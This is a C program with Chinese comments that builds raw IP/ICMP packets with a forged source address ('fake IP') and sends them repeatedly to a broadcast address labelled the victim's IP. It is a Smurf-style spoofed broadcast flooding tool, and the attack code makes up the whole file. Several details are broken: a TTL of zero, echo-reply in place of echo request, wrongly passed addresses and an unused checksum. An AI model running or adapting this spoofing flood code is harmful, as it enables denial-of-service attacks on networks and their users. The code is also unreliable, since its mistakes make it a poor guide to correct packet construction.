#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include<netinet/in.h>

//校验和涵数 ip头
unsigned short csum(unsigned short *packet, int packlen) {
    register unsigned long sum = 0;
    while (packlen > 1) {
        sum += *(packet++);
        packlen -= 2;
    }
    if (packlen > 0)
        sum += *(unsigned char *) packet;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (unsigned short) ~sum;
}

//校验和涵数 tcp头
unsigned short tcpcsum(unsigned char *iphdr, unsigned short *packet, int packlen) {
    unsigned short *buf;
    unsigned short res;
    buf = malloc(packlen + 12);
    if (buf == NULL)
        return 0;
    memcpy(buf, iphdr + 12, 8); //源IP地址和目标IP地址
    *(buf + 4) = htons((unsigned short) (*(iphdr + 9)));
    *(buf + 5) = htons((unsigned short) packlen);
    memcpy(buf + 6, packet, packlen);
    res = csum(buf, packlen + 12);
    free(buf);
    return res;
}

//校验和涵数icmp头
unsigned short in_cksum(unsigned short *addr, int len) {
    int sum = 0;
    unsigned short res = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if (len == 1) {
        *((unsigned char *) (&res)) = *((unsigned char *) addr);
        sum += res;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    res = ~sum;
    return res;
}

int main(int argc, char *argv[]) {
    int sock, bytes_send;
    struct sockaddr_in sin;

    struct ip *iphead;
    struct icmp *icmphead;
    char *packet;
    int pktsize = sizeof(struct ip) + sizeof(struct icmp) + 64;

    packet = malloc(pktsize);
    iphead = (struct ip *) packet;
    icmphead = (struct icmp *) (packet + sizeof(struct ip));

    memset(packet, 0, pktsize);

    printf("create socket\r\n");
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("192.168.0.255"); //被攻击者的ip
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (sock > 0) {
        printf("socket ok\n");
    } else {
        printf("socket error \n");
    }

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &pktsize, sizeof(pktsize)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    const int on = 1;//设定常量，用于打开广播模式
    //设定该接口上的广播模式
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    printf("create iphead\r\n");
    iphead->ip_v = 4;
    iphead->ip_hl = 5;
    iphead->ip_tos = 0x00;
    iphead->ip_len = htons(pktsize);
    iphead->ip_id = htons(getpid());
    iphead->ip_off = 0;
    iphead->ip_ttl = 0x0;
    iphead->ip_p = IPPROTO_ICMP;
    iphead->ip_sum = 0;
    inet_aton("192.168.0.182", iphead->ip_src);//假冒的ip
    inet_aton("192.168.0.255", iphead->ip_dst);//被攻击者的ip

    printf("create icmphead\r\n");
    icmphead->icmp_type = ICMP_ECHOREPLY;
    icmphead->icmp_code = 0;
    icmphead->icmp_cksum = htons(~(ICMP_ECHO << 8));

    printf("start send\r\n");

    int j;
    int i = 50;
    while (i > 0) {
        sendto(sock, packet, pktsize, 0, (struct sockaddr *) &sin, sizeof(sin));
        printf("sending\r\n");
        i--;
    }
    free(packet);
    printf("end send\r\n");
    return 0;
}
